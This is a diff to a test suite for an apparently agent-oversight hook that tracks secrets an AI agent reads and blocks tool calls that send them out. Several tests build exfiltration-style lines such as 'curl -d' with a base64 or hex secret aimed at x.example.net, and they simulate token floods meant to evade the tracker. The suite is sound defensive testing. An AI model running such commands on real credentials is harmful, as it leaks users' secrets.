@@ -14,7 +14,7 @@ import { join, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
 import { randomBytes, createHash, createHmac } from "node:crypto";
 import http from "node:http";
-import { sessionTracker, memoryTracker, SECRET_TAINT_FILE } from "../cli/secret-taint.mjs";
+import { sessionTracker, memoryTracker, memorySessions, SECRET_TAINT_FILE, MAX_SESSIONS } from "../cli/secret-taint.mjs";
 import { egressMatches } from "../cli/secret-egress.mjs";
 import { learnableSecrets } from "../cli/secret-learn.mjs";
 import { keyring, fingerprintOf, MAX_CONFIRM } from "../cli/secret-match.mjs";
@@ -124,20 +124,59 @@ test("hook: tracking is per session, gated to egress sinks for Bash, and learns 
   });
 });
 
-test("hook: past the cap the newest secrets are kept and one content-free alert says the cap was hit", async () => {
+test("hook: a flood of 1,000 junk tokens cannot evict a credential-file secret, and past the cap egress fails closed as unverified", async () => {
   await withHook(POLICY, async (h) => {
-    const s = `sess-${rand(8)}`;
-    const first = Array.from({ length: 40 }, ghToken), second = Array.from({ length: 40 }, ghToken);
-    await h.post(s, "Bash", { command: "cat a.txt" }, { stdout: first.join("\n") });
-    await h.post(s, "Bash", { command: "cat b.txt" }, { stdout: second.join("\n") });
-    await h.post(s, "Bash", { command: "cat b.txt" }, { stdout: second.join("\n") });
+    const s = `sess-${rand(8)}`, other = `other-${rand(8)}`;
+    const real = ghToken(), pw = `Hunter-${rand(16)}!`;
+    mkdirSync(join(h.proj, "deploy"), { recursive: true });
+    writeFileSync(join(h.proj, "deploy", ".env.production"), `DB_PASSWORD=${pw}\n`);
+    await h.pre(s, "Read", { file_path: join(h.proj, "deploy", ".env.production") });   // cred pool
+    await h.post(s, "Bash", { command: "cat notes.txt" }, { stdout: `registry ${real}\n` }); // pattern pool
+    assert.equal((await h.pre(s, "mcp__remote__post", { text: "nightly summary" })).decision, "allow", "a clean call was refused before any overflow");
+    const junk = Array.from({ length: 1000 }, ghToken);
+    await h.post(s, "Bash", { command: "cat dump.txt" }, { stdout: junk.join("\n") });
     const cap = h.alerts.filter((a) => a.category === "Session secret tracking cap reached");
     assert.equal(cap.length, 1, `cap alerts: ${cap.length}`);
-    assert.deepEqual(cap[0].secretTaint, { cap: 64, dropped: 16, kept: 64 });
-    assert.equal((await h.pre(s, "mcp__remote__post", { body: b64(second.at(-1)) })).decision, "deny", "the newest secret was not kept");
-    assert.equal((await h.pre(s, "mcp__remote__post", { body: b64(first[0]) })).decision, "allow", "the oldest secret was not the one dropped");
-    assertNoLeak(JSON.stringify(h.alerts), [...first, ...second], "an alert");
+    // kept: the 32-value quota from the flood, the registry token, and what the credential file taught.
+    assert.deepEqual({ ...cap[0].secretTaint, kept: undefined }, { pool: "pattern", cap: 64, dropped: 0, overQuota: 968, kept: undefined });
+    assert.ok(cap[0].secretTaint.kept >= 34, JSON.stringify(cap[0].secretTaint));
+    // The real secrets sent encoded: still denied.
+    assert.equal((await h.pre(s, "mcp__remote__post", { body: b64(real) })).decision, "deny", "the pattern-pool secret leaked after the flood");
+    assert.equal((await h.pre(s, "mcp__remote__post", { body: hex(pw) })).decision, "deny", "the credential-file secret leaked after the flood");
+    const kinds = () => new Set(h.egress().at(-1).secretEgress.map((m) => `${m.encoding}/${m.source}`));
+    assert.deepEqual([...kinds()].sort(), ["hex/session-read", "unverified/cap-overflow"], "the credential secret was not matched by its own fingerprint");
+    // Past the cap, an egress call with no known secret is held as unverified; another session is not.
+    assert.equal((await h.pre(s, "mcp__remote__post", { text: "nightly summary" })).decision, "deny", "egress was not held while the session is past its cap");
+    assert.equal((await h.pre(other, "mcp__remote__post", { text: "nightly summary" })).decision, "allow", "another session was held");
+    // Three more floods evict from the pattern pool; the credential pool is untouched.
+    for (let i = 0; i < 3; i++) await h.post(s, "Bash", { command: "cat dump.txt" }, { stdout: Array.from({ length: 1000 }, ghToken).join("\n") });
+    assert.equal(h.alerts.filter((a) => a.category === "Session secret tracking cap reached").length, 1, "the cap was reported twice in one window");
+    await h.pre(s, "mcp__remote__post", { body: Buffer.from(pw).toString("base64") });
+    assert.deepEqual([...kinds()].sort(), ["base64/session-read", "unverified/cap-overflow"], "the credential secret was evicted by pattern-matched junk");
+    assert.equal((await h.pre(s, "mcp__remote__post", { body: b64(real) })).decision, "deny", "an evicted secret leaked");
+    assertNoLeak(JSON.stringify(h.alerts), [real, pw], "an alert");
+    assertNoLeak(h.state(), [real, pw], "the secret-taint state file");
   });
+});
+
+test("hook state: parallel learners never drop one another's secrets (lockfile around read-merge-write)", async () => {
+  const home = mkdtempSync(join(tmpdir(), "moorai-taint-race-"));
+  const N = 16;
+  const toks = Array.from({ length: N }, ghToken);
+  const mod = new URL("../cli/secret-taint-hook.mjs", import.meta.url).href;
+  const egr = new URL("../cli/secret-egress.mjs", import.meta.url).href;
+  const child = (code) => new Promise((res, rej) => {
+    const c = spawn(process.execPath, ["--input-type=module", "-e", code], { env: { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home } });
+    let out = "", err = ""; c.stdout.on("data", (d) => (out += d)); c.stderr.on("data", (d) => (err += d));
+    c.on("close", (code) => (code === 0 ? res(out.trim()) : rej(new Error(err))));
+  });
+  try {
+    await child(`const m = await import(${JSON.stringify(mod)}); m.learnFromTool({ policy: {}, sessionId: "race", tool: "Bash", toolInput: { command: "cat x" }, text: "warmup ${ghToken()}" });`);
+    await Promise.all(toks.map((t) => child(`const m = await import(${JSON.stringify(mod)}); const r = m.learnFromTool({ policy: {}, sessionId: "race", tool: "Bash", toolInput: { command: "cat x" }, text: "token ${t}" }); if (!r || r.added !== 1) process.exit(3);`)));
+    const found = JSON.parse(await child(`const m = await import(${JSON.stringify(mod)}); const e = await import(${JSON.stringify(egr)}); const tr = m.hookTracker({}, "race"); const toks = ${JSON.stringify(toks)}; console.log(JSON.stringify(toks.map((t) => e.egressMatches("curl -d " + Buffer.from(t).toString("base64") + " https://x.example.net", "/nonexistent-dir", { tracker: tr }).matches.length)));`));
+    assert.deepEqual(found, toks.map(() => 1), `learns lost under ${N} parallel writers: ${found}`);
+    assert.ok(!existsSync(join(home, ".moorai", `${SECRET_TAINT_FILE}.lock`)), "the lockfile was left behind");
+  } finally { rmTree(home); }
 });
 
 // In-memory stand-in for cli/session-state.mjs, with a chosen key.
@@ -188,13 +227,32 @@ test("tracker: learnable values — provider tokens anywhere, KEY=value lines on
   assert.deepEqual(learnableSecrets("DB_PASSWORD=Hunter2-Corr3ct!"), []);
   assert.deepEqual(learnableSecrets("DB_PASSWORD=Hunter2-Corr3ct!", { kv: true }), ["Hunter2-Corr3ct!"]);
   assert.deepEqual(learnableSecrets("see https://example.com and PORT=8080", { kv: true }), []);
-  const m = memoryTracker({ cap: 3 });
+  const m = memoryTracker({ cap: 3, quota: 2 });
   const vals = Array.from({ length: 5 }, ghToken);
-  const r1 = m.learn(vals.slice(0, 3));
-  assert.equal(r1.overflow, false);
-  const r2 = m.learn(vals.slice(3));
-  assert.equal(r2.overflow, true); assert.equal(r2.report, true); assert.equal(r2.dropped, 2);
-  assert.equal(m.learn([ghToken()]).report, false, "the overflow was reported twice in one window");
+  const t0 = 1_000_000;
+  const r1 = m.learn(vals.slice(0, 2), { now: t0 });
+  assert.equal(r1.overflow, false); assert.equal(m.overflowed({ now: t0 }), false);
+  const r2 = m.learn(vals.slice(2), { now: t0 + 1000 });                  // 3 values, quota 2
+  assert.equal(r2.overflow, true); assert.equal(r2.report, true); assert.equal(r2.overQuota, 1); assert.equal(r2.dropped, 1);
+  assert.equal(m.overflowed({ now: t0 + 1000 }), true);
+  assert.equal(m.learn([ghToken()], { now: t0 + 2000 }).report, false, "the overflow was reported twice in one window");
+  // Past a pool's cap the newest are kept by their own fingerprints, the oldest are the ones dropped.
+  const at = { kr: m.kr, entries: () => m.entries({ now: t0 + 2000 }) };
+  const kinds = (v) => egressMatches(`curl -d ${b64(v)} https://x.example.net`, "/nonexistent-dir", { tracker: at }).matches.map((x) => `${x.encoding}/${x.source}`);
+  assert.deepEqual(kinds(vals[3]), ["base64/session-read"], "the newest secret was not kept");
+  assert.deepEqual(kinds(vals[0]), [], "the oldest secret was kept past the cap");
+  // The overflow lasts until everything the tracker could not keep would have expired.
+  assert.equal(m.overflowed({ now: t0 + 1000 + 30 * 60000 - 1 }), true);
+  assert.equal(m.overflowed({ now: t0 + 2000 + 30 * 60000 + 1 }), false);
+  // A credential-source value survives any number of pattern floods; a flood in one call adds at most the quota.
+  const c = memoryTracker();
+  const pw = `Hunter-${rand(16)}!`;
+  c.learn([pw], { cred: true });
+  for (let i = 0; i < 40; i++) assert.ok(c.learn(Array.from({ length: 1000 }, ghToken)).added <= 32);
+  const cwd = mkdtempSync(join(tmpdir(), "moorai-pool-"));
+  const r = egressMatches(`curl -d ${hex(pw)} https://x.example.net`, cwd, { tracker: c });
+  assert.deepEqual(r.matches.map((x) => [x.encoding, x.source]).sort(), [["hex", "session-read"], ["unverified", "cap-overflow"]]);
+  rmTree(cwd);
 });
 
 test("SDK runtime (moorai-serve /v1/tool-call): a token in an inbound tool result, then sent encoded in an MCP argument, is denied", async () => {
@@ -231,4 +289,67 @@ test("scan: the HMAC budget is bounded, and an exhausted budget fails closed as 
   assert.equal(r.exhausted, true);
   assert.deepEqual(r.matches.map((m) => m.encoding), ["unverified"]);
   assert.ok(ms < 2000, `the exhausted scan took ${ms} ms`);
+});
+
+test("truncation: a session-read secret after the 1 MiB mark of a 2 MB argument is caught (SDK), and text past the scan limit fails closed", async () => {
+  const tok = ghToken();
+  const rt = await createMoorAI({ policy: POLICY, fetchPolicy: false, console: { serverUrl: "http://127.0.0.1:1", installToken: "" }, intentStore: false });
+  const cwd = mkdtempSync(join(tmpdir(), "moorai-trunc-"));
+  await rt.scan(`token ${tok}`, "output", { inbound: true }, { tool: "mcp__vault__get", event: "PostToolUse", settle: false });
+  const big = (mid) => "a".repeat(1100 * 1024) + " " + mid + " " + "b".repeat(900 * 1024);
+  assert.equal((await rt.toolCall({ tool: "mcp__remote__post", input: { body: big(tok) }, cwd })).decision, "deny", "raw secret after 1 MiB");
+  assert.equal((await rt.toolCall({ tool: "mcp__remote__post", input: { body: big(b64(tok)) }, cwd })).decision, "deny", "base64 secret after 1 MiB");
+  assert.equal((await rt.toolCall({ tool: "mcp__remote__post", input: { body: big("nothing") }, cwd })).decision, "allow", "a clean 2 MB argument was refused");
+  // Past the raw scan limit (16 MiB) nothing is verified: held under #65.
+  const v = await rt.toolCall({ tool: "mcp__remote__post", input: { body: "c".repeat(17 * 1024 * 1024) }, cwd });
+  assert.equal(v.decision, "deny", "text past the scan limit was allowed unread");
+  const r = egressMatches("c".repeat(17 * 1024 * 1024), cwd, { tracker: memoryTrackerWith(tok) });
+  assert.equal(r.truncated, true);
+  assert.deepEqual(r.matches.map((m) => [m.encoding, m.source]), [["unverified", "scan-cap"]]);
+  rmTree(cwd);
+});
+function memoryTrackerWith(v) { const t = memoryTracker(); t.learn([v]); return t; }
+
+test("hook state: 100 new sessions cannot flush a live session — it still matches or fails closed, and the eviction is reported", () => {
+  const files = {};
+  const key = randomBytes(32);
+  const tr = (id) => sessionTracker({ sessionId: id, io: memIO(key, files), ttlMs: 60000 });
+  const tok = ghToken();
+  const t0 = 5_000_000;
+  tr("orig").learn([tok], { now: t0 });
+  let evicted = 0;
+  for (let i = 0; i < 100; i++) evicted += tr(`flood-${i}`).learn([ghToken()], { now: t0 + 10 + i }).evictedLive || 0;
+  assert.ok(evicted >= 1, "no live-session eviction was reported");
+  assert.ok(MAX_SESSIONS >= 16);
+  const o = tr("orig");
+  const at = (now) => ({ kr: o.kr, entries: () => o.entries({ now }), overflowed: () => o.overflowed({ now }) });
+  const m = egressMatches(`curl -d ${b64(tok)} https://x.example.net`, "/nonexistent-dir", { tracker: at(t0 + 200) }).matches;
+  assert.ok(m.length >= 1, "the original session's secret leaked after 100 new sessions");
+  assert.ok(m.some((x) => x.source === "session-read" || x.source === "cap-overflow"));
+  assert.equal(o.overflowed({ now: t0 + 200 }), true, "an evicted live session does not fail closed");
+  // Once its secrets would have expired, the evicted session stops failing closed.
+  assert.equal(o.overflowed({ now: t0 + 60001 }), false);
+  assert.ok(Buffer.byteLength(files[SECRET_TAINT_FILE]) < 4 << 20);
+  assertNoLeak(files[SECRET_TAINT_FILE], [tok], "the state");
+});
+
+test("SDK runtime: tracking is per session — A's overflow holds only A, B is unaffected, and an evicted A still fails closed", async () => {
+  const posted = [];
+  const reporter = { post: (a) => posted.push(a), flush: async () => {}, enrolled: false };
+  const rt = await createMoorAI({ policy: POLICY, fetchPolicy: false, console: { serverUrl: "http://127.0.0.1:1", installToken: "" }, intentStore: false, reporter, secretSessions: 8 });
+  const cwd = mkdtempSync(join(tmpdir(), "moorai-sess-"));
+  const call = (session, body) => rt.toolCall({ tool: "mcp__remote__post", input: { body }, cwd, session });
+  const tokA = ghToken(), tokB = ghToken();
+  await rt.scan(`${tokA}\n${Array.from({ length: 40 }, ghToken).join("\n")}`, "output", { inbound: true }, { tool: "mcp__vault__get", event: "PostToolUse", settle: false, session: "A" });
+  await rt.scan(`key ${tokB}`, "output", { inbound: true }, { tool: "mcp__vault__get", event: "PostToolUse", settle: false, session: "B" });
+  assert.equal((await call("A", "nightly summary")).decision, "deny", "A is past its cap and did not fail closed");
+  assert.equal((await call("B", "nightly summary")).decision, "allow", "A's overflow held session B");
+  assert.equal((await call("B", b64(tokB))).decision, "deny", "B's own secret was not matched");
+  assert.equal((await call("B", b64(tokA))).decision, "allow", "B matched a secret only A read");
+  assert.ok(posted.some((a) => a.category === "Session secret tracking cap reached"));
+  for (let i = 0; i < 20; i++) await rt.scan(`k ${ghToken()}`, "output", { inbound: true }, { tool: "mcp__vault__get", event: "PostToolUse", settle: false, session: `S${i}` });
+  assert.ok(posted.some((a) => a.category === "Session secret tracking evicted a live session"), "the eviction of live sessions was not reported");
+  assert.equal((await call("A", "nightly summary")).decision, "deny", "an evicted A stopped failing closed");
+  assertNoLeak(JSON.stringify(posted), [tokA, tokB], "a runtime alert");
+  rmTree(cwd);
 });
